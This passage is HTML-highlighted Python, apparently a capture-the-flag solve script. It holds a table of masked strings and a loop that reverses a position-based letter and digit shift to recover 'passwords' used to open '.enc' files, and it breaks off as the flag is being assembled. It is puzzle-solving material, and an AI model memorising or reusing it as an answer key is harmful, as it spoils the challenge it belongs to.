+<span class="s2">&quot;118&quot;</span> <span class="p">:</span> <span class="s2">&quot;133557&quot;</span><span class="p">,</span><span class="s2">&quot;170&quot;</span> <span class="p">:</span> <span class="s2">&quot;01234&quot;</span><span class="p">,</span><span class="s2">&quot;221&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbjdppu&quot;</span><span class="p">,</span><span class="s2">&quot;275&quot;</span> <span class="p">:</span> <span class="s2">&quot;sboxiq&quot;</span><span class="p">,</span><span class="s2">&quot;328&quot;</span> <span class="p">:</span> <span class="s2">&quot;fscqgny&quot;</span><span class="p">,</span><span class="s2">&quot;380&quot;</span> <span class="p">:</span> <span class="s2">&quot;mzusehk8&quot;</span><span class="p">,</span>
+<span class="s2">&quot;119&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbadrl&quot;</span><span class="p">,</span><span class="s2">&quot;171&quot;</span> <span class="p">:</span> <span class="s2">&quot;fftqesjv&quot;</span><span class="p">,</span><span class="s2">&quot;222&quot;</span> <span class="p">:</span> <span class="s2">&quot;vjewsw&quot;</span><span class="p">,</span><span class="s2">&quot;276&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbohvtt&quot;</span><span class="p">,</span><span class="s2">&quot;329&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbuvmj&quot;</span><span class="p">,</span><span class="s2">&quot;381&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbdbfqal&quot;</span><span class="p">,</span>
+<span class="s2">&quot;11&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbpliq&quot;</span><span class="p">,</span><span class="s2">&quot;172&quot;</span> <span class="p">:</span> <span class="s2">&quot;ppmhqtt&quot;</span><span class="p">,</span><span class="s2">&quot;223&quot;</span> <span class="p">:</span> <span class="s2">&quot;hptvix&quot;</span><span class="p">,</span><span class="s2">&quot;277&quot;</span> <span class="p">:</span> <span class="s2">&quot;smksosua&quot;</span><span class="p">,</span><span class="s2">&quot;32&quot;</span> <span class="p">:</span> <span class="s2">&quot;pvtspj&quot;</span><span class="p">,</span><span class="s2">&quot;382&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbdumsg&quot;</span><span class="p">,</span>
+<span class="s2">&quot;120&quot;</span> <span class="p">:</span> <span class="s2">&quot;angumhg&quot;</span><span class="p">,</span><span class="s2">&quot;173&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbijmj&quot;</span><span class="p">,</span><span class="s2">&quot;224&quot;</span> <span class="p">:</span> <span class="s2">&quot;tjhiese&quot;</span><span class="p">,</span><span class="s2">&quot;278&quot;</span> <span class="p">:</span> <span class="s2">&quot;cvvliuol&quot;</span><span class="p">,</span><span class="s2">&quot;330&quot;</span> <span class="p">:</span> <span class="s2">&quot;bfpimhg&quot;</span><span class="p">,</span><span class="s2">&quot;383&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjekejr8&quot;</span><span class="p">,</span>
+<span class="s2">&quot;121&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbpfiw&quot;</span><span class="p">,</span><span class="s2">&quot;174&quot;</span> <span class="p">:</span> <span class="s2">&quot;cptddtt&quot;</span><span class="p">,</span><span class="s2">&quot;225&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbtlesg&quot;</span><span class="p">,</span><span class="s2">&quot;279&quot;</span> <span class="p">:</span> <span class="s2">&quot;mppnid7&quot;</span><span class="p">,</span><span class="s2">&quot;331&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpxh579&quot;</span><span class="p">,</span><span class="s2">&quot;384&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfhivje&quot;</span><span class="p">,</span>
+<span class="s2">&quot;122&quot;</span> <span class="p">:</span> <span class="s2">&quot;mpplgf&quot;</span><span class="p">,</span><span class="s2">&quot;175&quot;</span> <span class="p">:</span> <span class="s2">&quot;cikfojt&quot;</span><span class="p">,</span><span class="s2">&quot;226&quot;</span> <span class="p">:</span> <span class="s2">&quot;eewdviu&quot;</span><span class="p">,</span><span class="s2">&quot;27&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbuvatxk9&quot;</span><span class="p">,</span><span class="s2">&quot;332&quot;</span> <span class="p">:</span> <span class="s2">&quot;608204&quot;</span><span class="p">,</span><span class="s2">&quot;385&quot;</span> <span class="p">:</span> <span class="s2">&quot;sugsljt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;123&quot;</span> <span class="p">:</span> <span class="s2">&quot;rjekewj&quot;</span><span class="p">,</span><span class="s2">&quot;176&quot;</span> <span class="p">:</span> <span class="s2">&quot;pfrsiw&quot;</span><span class="p">,</span><span class="s2">&quot;227&quot;</span> <span class="p">:</span> <span class="s2">&quot;aofuix&quot;</span><span class="p">,</span><span class="s2">&quot;280&quot;</span> <span class="p">:</span> <span class="s2">&quot;51ehry&quot;</span><span class="p">,</span><span class="s2">&quot;333&quot;</span> <span class="p">:</span> <span class="s2">&quot;atfikm&quot;</span><span class="p">,</span><span class="s2">&quot;386&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpxh&quot;</span><span class="p">,</span>
+<span class="s2">&quot;124&quot;</span> <span class="p">:</span> <span class="s2">&quot;124578&quot;</span><span class="p">,</span><span class="s2">&quot;177&quot;</span> <span class="p">:</span> <span class="s2">&quot;cskvxnth&quot;</span><span class="p">,</span><span class="s2">&quot;228&quot;</span> <span class="p">:</span> <span class="s2">&quot;cpwuxskf&quot;</span><span class="p">,</span><span class="s2">&quot;281&quot;</span> <span class="p">:</span> <span class="s2">&quot;bpplxf&quot;</span><span class="p">,</span><span class="s2">&quot;334&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpnomuuw&quot;</span><span class="p">,</span><span class="s2">&quot;387&quot;</span> <span class="p">:</span> <span class="s2">&quot;dbmrxf&quot;</span><span class="p">,</span>
+<span class="s2">&quot;125&quot;</span> <span class="p">:</span> <span class="s2">&quot;pskqgjyz9&quot;</span><span class="p">,</span><span class="s2">&quot;178&quot;</span> <span class="p">:</span> <span class="s2">&quot;rbkqftc&quot;</span><span class="p">,</span><span class="s2">&quot;229&quot;</span> <span class="p">:</span> <span class="s2">&quot;bpqest&quot;</span><span class="p">,</span><span class="s2">&quot;282&quot;</span> <span class="p">:</span> <span class="s2">&quot;kfxlr&quot;</span><span class="p">,</span><span class="s2">&quot;335&quot;</span> <span class="p">:</span> <span class="s2">&quot;omkymf&quot;</span><span class="p">,</span><span class="s2">&quot;388&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbvkiwoum&quot;</span><span class="p">,</span>
+<span class="s2">&quot;126&quot;</span> <span class="p">:</span> <span class="s2">&quot;567890&quot;</span><span class="p">,</span><span class="s2">&quot;179&quot;</span> <span class="p">:</span> <span class="s2">&quot;kjuvix&quot;</span><span class="p">,</span><span class="s2">&quot;230&quot;</span> <span class="p">:</span> <span class="s2">&quot;kjuvqj&quot;</span><span class="p">,</span><span class="s2">&quot;283&quot;</span> <span class="p">:</span> <span class="s2">&quot;bjvfl&quot;</span><span class="p">,</span><span class="s2">&quot;336&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbpfiw&quot;</span><span class="p">,</span><span class="s2">&quot;389&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbfesd&quot;</span><span class="p">,</span>
+<span class="s2">&quot;127&quot;</span> <span class="p">:</span> <span class="s2">&quot;djcpssj&quot;</span><span class="p">,</span><span class="s2">&quot;17&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjekejr&quot;</span><span class="p">,</span><span class="s2">&quot;231&quot;</span> <span class="p">:</span> <span class="s2">&quot;hbtoid&quot;</span><span class="p">,</span><span class="s2">&quot;284&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbidrig&quot;</span><span class="p">,</span><span class="s2">&quot;337&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbolpf&quot;</span><span class="p">,</span><span class="s2">&quot;38&quot;</span> <span class="p">:</span> <span class="s2">&quot;fvencta&quot;</span><span class="p">,</span>
+<span class="s2">&quot;128&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbtrpnth&quot;</span><span class="p">,</span><span class="s2">&quot;180&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbpxiq&quot;</span><span class="p">,</span><span class="s2">&quot;232&quot;</span> <span class="p">:</span> <span class="s2">&quot;rppdpiu&quot;</span><span class="p">,</span><span class="s2">&quot;285&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbdbfte&quot;</span><span class="p">,</span><span class="s2">&quot;338&quot;</span> <span class="p">:</span> <span class="s2">&quot;qxguxdapwy&quot;</span><span class="p">,</span><span class="s2">&quot;390&quot;</span> <span class="p">:</span> <span class="s2">&quot;fftqesjh&quot;</span><span class="p">,</span>
+<span class="s2">&quot;129&quot;</span> <span class="p">:</span> <span class="s2">&quot;sugyis&quot;</span><span class="p">,</span><span class="s2">&quot;181&quot;</span> <span class="p">:</span> <span class="s2">&quot;mzusehk&quot;</span><span class="p">,</span><span class="s2">&quot;233&quot;</span> <span class="p">:</span> <span class="s2">&quot;imqyidub9&quot;</span><span class="p">,</span><span class="s2">&quot;286&quot;</span> <span class="p">:</span> <span class="s2">&quot;cbusiw&quot;</span><span class="p">,</span><span class="s2">&quot;339&quot;</span> <span class="p">:</span> <span class="s2">&quot;svrhvxzhz&quot;</span><span class="p">,</span><span class="s2">&quot;39&quot;</span> <span class="p">:</span> <span class="s2">&quot;135468&quot;</span><span class="p">,</span>
+<span class="s2">&quot;12&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbdbknxs&quot;</span><span class="p">,</span><span class="s2">&quot;182&quot;</span> <span class="p">:</span> <span class="s2">&quot;rfdhpik&quot;</span><span class="p">,</span><span class="s2">&quot;234&quot;</span> <span class="p">:</span> <span class="s2">&quot;psgfmtaz&quot;</span><span class="p">,</span><span class="s2">&quot;287&quot;</span> <span class="p">:</span> <span class="s2">&quot;bsgqhf&quot;</span><span class="p">,</span><span class="s2">&quot;33&quot;</span> <span class="p">:</span> <span class="s2">&quot;aoihp&quot;</span><span class="p">,</span><span class="s2">&quot;391&quot;</span> <span class="p">:</span> <span class="s2">&quot;wfuwpnll&quot;</span><span class="p">,</span>
+<span class="s2">&quot;130&quot;</span> <span class="p">:</span> <span class="s2">&quot;rbpjiwy&quot;</span><span class="p">,</span><span class="s2">&quot;183&quot;</span> <span class="p">:</span> <span class="s2">&quot;aoihp6&quot;</span><span class="p">,</span><span class="s2">&quot;235&quot;</span> <span class="p">:</span> <span class="s2">&quot;odvrfjx&quot;</span><span class="p">,</span><span class="s2">&quot;288&quot;</span> <span class="p">:</span> <span class="s2">&quot;aekgex&quot;</span><span class="p">,</span><span class="s2">&quot;340&quot;</span> <span class="p">:</span> <span class="s2">&quot;hbtucuuabnb&quot;</span><span class="p">,</span><span class="s2">&quot;392&quot;</span> <span class="p">:</span> <span class="s2">&quot;bmqqhnk&quot;</span><span class="p">,</span>
+<span class="s2">&quot;131&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpwlwj&quot;</span><span class="p">,</span><span class="s2">&quot;184&quot;</span> <span class="p">:</span> <span class="s2">&quot;rjedviu&quot;</span><span class="p">,</span><span class="s2">&quot;236&quot;</span> <span class="p">:</span> <span class="s2">&quot;iowbexnh&quot;</span><span class="p">,</span><span class="s2">&quot;289&quot;</span> <span class="p">:</span> <span class="s2">&quot;kjvwis&quot;</span><span class="p">,</span><span class="s2">&quot;341&quot;</span> <span class="p">:</span> <span class="s2">&quot;iicwidub&quot;</span><span class="p">,</span><span class="s2">&quot;393&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbuxoj&quot;</span><span class="p">,</span>
+<span class="s2">&quot;132&quot;</span> <span class="p">:</span> <span class="s2">&quot;oscqkj&quot;</span><span class="p">,</span><span class="s2">&quot;185&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbdbkzxs&quot;</span><span class="p">,</span><span class="s2">&quot;237&quot;</span> <span class="p">:</span> <span class="s2">&quot;pfcfljy&quot;</span><span class="p">,</span><span class="s2">&quot;28&quot;</span> <span class="p">:</span> <span class="s2">&quot;spefiw&quot;</span><span class="p">,</span><span class="s2">&quot;342&quot;</span> <span class="p">:</span> <span class="s2">&quot;cicupjy&quot;</span><span class="p">,</span><span class="s2">&quot;394&quot;</span> <span class="p">:</span> <span class="s2">&quot;snkoid&quot;</span><span class="p">,</span>
+<span class="s2">&quot;133&quot;</span> <span class="p">:</span> <span class="s2">&quot;791791&quot;</span><span class="p">,</span><span class="s2">&quot;186&quot;</span> <span class="p">:</span> <span class="s2">&quot;hfcyis&quot;</span><span class="p">,</span><span class="s2">&quot;238&quot;</span> <span class="p">:</span> <span class="s2">&quot;vftrrnih&quot;</span><span class="p">,</span><span class="s2">&quot;290&quot;</span> <span class="p">:</span> <span class="s2">&quot;kbthr&quot;</span><span class="p">,</span><span class="s2">&quot;343&quot;</span> <span class="p">:</span> <span class="s2">&quot;mppluzk&quot;</span><span class="p">,</span><span class="s2">&quot;395&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbenwtt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;134&quot;</span> <span class="p">:</span> <span class="s2">&quot;901234&quot;</span><span class="p">,</span><span class="s2">&quot;187&quot;</span> <span class="p">:</span> <span class="s2">&quot;56789&quot;</span><span class="p">,</span><span class="s2">&quot;239&quot;</span> <span class="p">:</span> <span class="s2">&quot;citlw&quot;</span><span class="p">,</span><span class="s2">&quot;291&quot;</span> <span class="p">:</span> <span class="s2">&quot;mvuwesm&quot;</span><span class="p">,</span><span class="s2">&quot;344&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjfqmlna&quot;</span><span class="p">,</span><span class="s2">&quot;396&quot;</span> <span class="p">:</span> <span class="s2">&quot;sjospj&quot;</span><span class="p">,</span>
+<span class="s2">&quot;135&quot;</span> <span class="p">:</span> <span class="s2">&quot;siquxd&quot;</span><span class="p">,</span><span class="s2">&quot;188&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbuhffrs&quot;</span><span class="p">,</span><span class="s2">&quot;23&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjekiqrl&quot;</span><span class="p">,</span><span class="s2">&quot;292&quot;</span> <span class="p">:</span> <span class="s2">&quot;itceiq&quot;</span><span class="p">,</span><span class="s2">&quot;345&quot;</span> <span class="p">:</span> <span class="s2">&quot;vjpfisz&quot;</span><span class="p">,</span><span class="s2">&quot;397&quot;</span> <span class="p">:</span> <span class="s2">&quot;mfndrnk&quot;</span><span class="p">,</span>
+<span class="s2">&quot;136&quot;</span> <span class="p">:</span> <span class="s2">&quot;12345&quot;</span><span class="p">,</span><span class="s2">&quot;189&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbtwms&quot;</span><span class="p">,</span><span class="s2">&quot;240&quot;</span> <span class="p">:</span> <span class="s2">&quot;890123&quot;</span><span class="p">,</span><span class="s2">&quot;293&quot;</span> <span class="p">:</span> <span class="s2">&quot;nbvdpnk&quot;</span><span class="p">,</span><span class="s2">&quot;346&quot;</span> <span class="p">:</span> <span class="s2">&quot;citlwyoum&quot;</span><span class="p">,</span><span class="s2">&quot;398&quot;</span> <span class="p">:</span> <span class="s2">&quot;sugdyf&quot;</span><span class="p">,</span>
+<span class="s2">&quot;137&quot;</span> <span class="p">:</span> <span class="s2">&quot;nbvkes&quot;</span><span class="p">,</span><span class="s2">&quot;18&quot;</span> <span class="p">:</span> <span class="s2">&quot;atjoid&quot;</span><span class="p">,</span><span class="s2">&quot;241&quot;</span> <span class="p">:</span> <span class="s2">&quot;aetlesg&quot;</span><span class="p">,</span><span class="s2">&quot;294&quot;</span> <span class="p">:</span> <span class="s2">&quot;cvvhepu&quot;</span><span class="p">,</span><span class="s2">&quot;347&quot;</span> <span class="p">:</span> <span class="s2">&quot;aqroix&quot;</span><span class="p">,</span><span class="s2">&quot;399&quot;</span> <span class="p">:</span> <span class="s2">&quot;dpnslntz&quot;</span><span class="p">,</span>
+<span class="s2">&quot;138&quot;</span> <span class="p">:</span> <span class="s2">&quot;soqrtd&quot;</span><span class="p">,</span><span class="s2">&quot;190&quot;</span> <span class="p">:</span> <span class="s2">&quot;gsghrigf&quot;</span><span class="p">,</span><span class="s2">&quot;242&quot;</span> <span class="p">:</span> <span class="s2">&quot;cvvli&quot;</span><span class="p">,</span><span class="s2">&quot;295&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbxliw&quot;</span><span class="p">,</span><span class="s2">&quot;348&quot;</span> <span class="p">:</span> <span class="s2">&quot;sdqutnu&quot;</span><span class="p">,</span><span class="s2">&quot;3&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbuvatxk&quot;</span><span class="p">,</span>
+<span class="s2">&quot;139&quot;</span> <span class="p">:</span> <span class="s2">&quot;gbdumjr&quot;</span><span class="p">,</span><span class="s2">&quot;191&quot;</span> <span class="p">:</span> <span class="s2">&quot;npxhqgky&quot;</span><span class="p">,</span><span class="s2">&quot;243&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbohw&quot;</span><span class="p">,</span><span class="s2">&quot;296&quot;</span> <span class="p">:</span> <span class="s2">&quot;791791791&quot;</span><span class="p">,</span><span class="s2">&quot;349&quot;</span> <span class="p">:</span> <span class="s2">&quot;jptges80&quot;</span><span class="p">,</span><span class="s2">&quot;400&quot;</span> <span class="p">:</span> <span class="s2">&quot;rpdhvyu&quot;</span><span class="p">,</span>
+<span class="s2">&quot;13&quot;</span> <span class="p">:</span> <span class="s2">&quot;mppnid&quot;</span><span class="p">,</span><span class="s2">&quot;192&quot;</span> <span class="p">:</span> <span class="s2">&quot;amavwf&quot;</span><span class="p">,</span><span class="s2">&quot;244&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbpdrf&quot;</span><span class="p">,</span><span class="s2">&quot;297&quot;</span> <span class="p">:</span> <span class="s2">&quot;135999&quot;</span><span class="p">,</span><span class="s2">&quot;34&quot;</span> <span class="p">:</span> <span class="s2">&quot;jptges&quot;</span><span class="p">,</span><span class="s2">&quot;401&quot;</span> <span class="p">:</span> <span class="s2">&quot;fmwijd&quot;</span><span class="p">,</span>
+<span class="s2">&quot;140&quot;</span> <span class="p">:</span> <span class="s2">&quot;hvpwiw&quot;</span><span class="p">,</span><span class="s2">&quot;193&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbflwtt&quot;</span><span class="p">,</span><span class="s2">&quot;245&quot;</span> <span class="p">:</span> <span class="s2">&quot;pskqgj&quot;</span><span class="p">,</span><span class="s2">&quot;298&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbtdl&quot;</span><span class="p">,</span><span class="s2">&quot;350&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpthrf&quot;</span><span class="p">,</span><span class="s2">&quot;402&quot;</span> <span class="p">:</span> <span class="s2">&quot;tfthwf&quot;</span><span class="p">,</span>
+<span class="s2">&quot;141&quot;</span> <span class="p">:</span> <span class="s2">&quot;ciguvd&quot;</span><span class="p">,</span><span class="s2">&quot;194&quot;</span> <span class="p">:</span> <span class="s2">&quot;mpvkiw&quot;</span><span class="p">,</span><span class="s2">&quot;246&quot;</span> <span class="p">:</span> <span class="s2">&quot;fskhri&quot;</span><span class="p">,</span><span class="s2">&quot;299&quot;</span> <span class="p">:</span> <span class="s2">&quot;bpyzsb&quot;</span><span class="p">,</span><span class="s2">&quot;351&quot;</span> <span class="p">:</span> <span class="s2">&quot;aofuijg&quot;</span><span class="p">,</span><span class="s2">&quot;403&quot;</span> <span class="p">:</span> <span class="s2">&quot;pjioiy&quot;</span><span class="p">,</span>
+<span class="s2">&quot;142&quot;</span> <span class="p">:</span> <span class="s2">&quot;kjnoiw&quot;</span><span class="p">,</span><span class="s2">&quot;195&quot;</span> <span class="p">:</span> <span class="s2">&quot;135666&quot;</span><span class="p">,</span><span class="s2">&quot;247&quot;</span> <span class="p">:</span> <span class="s2">&quot;jfuxw6&quot;</span><span class="p">,</span><span class="s2">&quot;29&quot;</span> <span class="p">:</span> <span class="s2">&quot;aovksse&quot;</span><span class="p">,</span><span class="s2">&quot;352&quot;</span> <span class="p">:</span> <span class="s2">&quot;mftfiikz&quot;</span><span class="p">,</span><span class="s2">&quot;404&quot;</span> <span class="p">:</span> <span class="s2">&quot;rppdpi&quot;</span><span class="p">,</span>
+<span class="s2">&quot;143&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbpgvf&quot;</span><span class="p">,</span><span class="s2">&quot;196&quot;</span> <span class="p">:</span> <span class="s2">&quot;135dfh&quot;</span><span class="p">,</span><span class="s2">&quot;248&quot;</span> <span class="p">:</span> <span class="s2">&quot;csavxfr&quot;</span><span class="p">,</span><span class="s2">&quot;300&quot;</span> <span class="p">:</span> <span class="s2">&quot;pptwylgs&quot;</span><span class="p">,</span><span class="s2">&quot;353&quot;</span> <span class="p">:</span> <span class="s2">&quot;kbvkiwoum&quot;</span><span class="p">,</span><span class="s2">&quot;405&quot;</span> <span class="p">:</span> <span class="s2">&quot;smkgixnve&quot;</span><span class="p">,</span>
+<span class="s2">&quot;144&quot;</span> <span class="p">:</span> <span class="s2">&quot;amgmesjyw&quot;</span><span class="p">,</span><span class="s2">&quot;197&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbjdppoai&quot;</span><span class="p">,</span><span class="s2">&quot;249&quot;</span> <span class="p">:</span> <span class="s2">&quot;cfnwmh&quot;</span><span class="p">,</span><span class="s2">&quot;301&quot;</span> <span class="p">:</span> <span class="s2">&quot;lbwue&quot;</span><span class="p">,</span><span class="s2">&quot;354&quot;</span> <span class="p">:</span> <span class="s2">&quot;cicuqjj&quot;</span><span class="p">,</span><span class="s2">&quot;406&quot;</span> <span class="p">:</span> <span class="s2">&quot;atfikmprt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;145&quot;</span> <span class="p">:</span> <span class="s2">&quot;bvuwiw&quot;</span><span class="p">,</span><span class="s2">&quot;198&quot;</span> <span class="p">:</span> <span class="s2">&quot;bbvpes&quot;</span><span class="p">,</span><span class="s2">&quot;24&quot;</span> <span class="p">:</span> <span class="s2">&quot;tjijiw&quot;</span><span class="p">,</span><span class="s2">&quot;302&quot;</span> <span class="p">:</span> <span class="s2">&quot;789012&quot;</span><span class="p">,</span><span class="s2">&quot;355&quot;</span> <span class="p">:</span> <span class="s2">&quot;ackjenr&quot;</span><span class="p">,</span><span class="s2">&quot;407&quot;</span> <span class="p">:</span> <span class="s2">&quot;mjpqmj&quot;</span><span class="p">,</span>
+<span class="s2">&quot;146&quot;</span> <span class="p">:</span> <span class="s2">&quot;gfqukj&quot;</span><span class="p">,</span><span class="s2">&quot;199&quot;</span> <span class="p">:</span> <span class="s2">&quot;sfrwirhlz&quot;</span><span class="p">,</span><span class="s2">&quot;250&quot;</span> <span class="p">:</span> <span class="s2">&quot;zyeyfss&quot;</span><span class="p">,</span><span class="s2">&quot;303&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbtyms&quot;</span><span class="p">,</span><span class="s2">&quot;356&quot;</span> <span class="p">:</span> <span class="s2">&quot;rbhdiq&quot;</span><span class="p">,</span><span class="s2">&quot;408&quot;</span> <span class="p">:</span> <span class="s2">&quot;nfybswq&quot;</span><span class="p">,</span>
+<span class="s2">&quot;147&quot;</span> <span class="p">:</span> <span class="s2">&quot;bskwxftf&quot;</span><span class="p">,</span><span class="s2">&quot;19&quot;</span> <span class="p">:</span> <span class="s2">&quot;qxguxd&quot;</span><span class="p">,</span><span class="s2">&quot;251&quot;</span> <span class="p">:</span> <span class="s2">&quot;eeydvi&quot;</span><span class="p">,</span><span class="s2">&quot;304&quot;</span> <span class="p">:</span> <span class="s2">&quot;dfplwj&quot;</span><span class="p">,</span><span class="s2">&quot;357&quot;</span> <span class="p">:</span> <span class="s2">&quot;idgfvjgt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;148&quot;</span> <span class="p">:</span> <span class="s2">&quot;amgmesjyi&quot;</span><span class="p">,</span><span class="s2">&quot;200&quot;</span> <span class="p">:</span> <span class="s2">&quot;dfehqgky&quot;</span><span class="p">,</span><span class="s2">&quot;252&quot;</span> <span class="p">:</span> <span class="s2">&quot;omkyiw&quot;</span><span class="p">,</span><span class="s2">&quot;305&quot;</span> <span class="p">:</span> <span class="s2">&quot;tjihvx&quot;</span><span class="p">,</span><span class="s2">&quot;358&quot;</span> <span class="p">:</span> <span class="s2">&quot;mfzlgt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;149&quot;</span> <span class="p">:</span> <span class="s2">&quot;pbvumhoh&quot;</span><span class="p">,</span><span class="s2">&quot;20&quot;</span> <span class="p">:</span> <span class="s2">&quot;123456&quot;</span><span class="p">,</span><span class="s2">&quot;253&quot;</span> <span class="p">:</span> <span class="s2">&quot;djcqe&quot;</span><span class="p">,</span><span class="s2">&quot;306&quot;</span> <span class="p">:</span> <span class="s2">&quot;vpnoidhhtu&quot;</span><span class="p">,</span><span class="s2">&quot;359&quot;</span> <span class="p">:</span> <span class="s2">&quot;bskdrsg&quot;</span><span class="p">,</span>
+<span class="s2">&quot;14&quot;</span> <span class="p">:</span> <span class="s2">&quot;lpxhpd&quot;</span><span class="p">,</span><span class="s2">&quot;201&quot;</span> <span class="p">:</span> <span class="s2">&quot;mptjes&quot;</span><span class="p">,</span><span class="s2">&quot;254&quot;</span> <span class="p">:</span> <span class="s2">&quot;sbovysm&quot;</span><span class="p">,</span><span class="s2">&quot;307&quot;</span> <span class="p">:</span> <span class="s2">&quot;jbusiw&quot;</span><span class="p">,</span><span class="s2">&quot;35&quot;</span> <span class="p">:</span> <span class="s2">&quot;ljxhvuuvt&quot;</span><span class="p">,</span>
+<span class="s2">&quot;150&quot;</span> <span class="p">:</span> <span class="s2">&quot;rbekiq&quot;</span><span class="p">,</span><span class="s2">&quot;202&quot;</span> <span class="p">:</span> <span class="s2">&quot;mbtlttyh&quot;</span><span class="p">,</span><span class="s2">&quot;255&quot;</span> <span class="p">:</span> <span class="s2">&quot;fsghhts&quot;</span><span class="p">,</span><span class="s2">&quot;308&quot;</span> <span class="p">:</span> <span class="s2">&quot;rpenwygy&quot;</span><span class="p">,</span><span class="s2">&quot;360&quot;</span> <span class="p">:</span> <span class="s2">&quot;njtyesg&quot;</span><span class="p">}</span>
+<span class="n">password</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">password_enc</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">409</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">password_masked</span><span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">l</span><span class="p">)]</span>
+        <span class="n">password_enc</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">open</span><span class="p">((</span><span class="nb">str</span><span class="p">(</span><span class="n">l</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;_&#39;</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="s2">&quot;.enc&quot;</span><span class="p">),</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">password</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="n">password_enc</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+        <span class="k">continue</span>    
+    <span class="n">password</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">((((</span><span class="n">c</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">))</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ascii_lowercase</span><span class="p">)</span> <span class="o">+</span> <span class="p">(((</span><span class="n">c</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">))</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ascii_lowercase</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span><span class="p">,</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">([</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">x</span><span class="p">],</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xff</span><span class="p">))]))</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)):</span>
